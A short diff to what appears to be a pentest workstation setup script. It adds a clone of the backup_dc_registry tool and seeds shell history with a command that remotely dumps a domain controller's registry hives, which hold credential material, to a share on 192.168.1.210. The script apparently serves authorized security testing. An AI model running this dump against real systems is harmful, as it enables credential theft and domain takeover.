@@ -80,6 +80,11 @@ rm assetfinder-linux-amd64-0.1.1.tgz
 echo "alias assetfinder='$RECON_DIR/assetfinder'" >> ~/.zshrc
 echo "assetfinder domain.com" >> ~/.zsh_history
 
+# Backup_dc_registry
+cd $INTERNALS_DIR
+git clone https://github.com/horizon3ai/backup_dc_registry
+echo "python reg.py user:pass@ip backup -path '\\192.168.1.210\shared\'" >> ~/.zsh_history
+
 # Bbot
 pipx install bbot
 
